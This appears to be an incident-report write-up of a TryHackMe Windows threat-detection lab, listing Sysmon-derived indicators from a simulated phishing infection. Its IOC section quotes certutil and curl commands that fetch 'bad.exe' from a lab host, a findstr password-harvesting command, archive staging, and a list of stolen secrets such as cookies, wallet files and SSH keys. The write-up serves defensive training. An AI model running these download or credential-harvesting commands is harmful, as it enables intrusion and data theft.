Windows Threat Detection 2 (TryHackMe)

1. Incident Summary
After Initial Access through a phishing attachment (invoice.pdf.exe), the host showed a chain of post-breach activity. It started with Discovery commands, then moved to Collection, Exfiltration and Ingress Tool Transfer. The alerts came from Sysmon logs: Event ID 1 (process creation) for the command sequences, Event ID 22 (DNS query) and Event ID 11 (file created) for the downloads.

2. Analysis (key IOCs)

Process tree: C:\Users\victim\Downloads\invoice.pdf.exe → cmd.exe and powershell.exe.
Discovery commands: ipconfig, whoami /priv, dir, net user, tasklist /v, wmic computersystem get model, Get-Service, Get-MpPreference.
Collection and staging: Notepad/WordPad opening files, findstr password > C:\Temp\passwords.txt, Compress-Archive, and 7za.exe a -tzip C:\Temp\stolen_data.zip.
Targeted data: Chrome History and Cookies, wallet.dat, .ssh\*, SQL Server DATA\*, and Signal and Telegram data.
Stealer sample: C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe.
Tool transfer:
    certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe
    curl.exe https://blackhat.thm/bad.exe -o good.exe
    PowerShell Invoke-WebRequest
    trojan.exe from the appsforfree URL

3. Verdict & Scope
This is actual malicious activity, simulated in the lab, so not a false positive. Commands like ipconfig are often legitimate, so the verdict rests on the parent process (invoice.pdf.exe), the commands coming in sequence, and the outbound connections. The assets touched are the lab Windows VM and the user's Desktop, Downloads, Documents and C:\Temp folders.

4. Remediation
The room doesn't cover remediation, so this section is generic: isolate the host, remove the downloaded files and archives, and block the contacted domains. I can drop it or rewrite it from your own lab notes.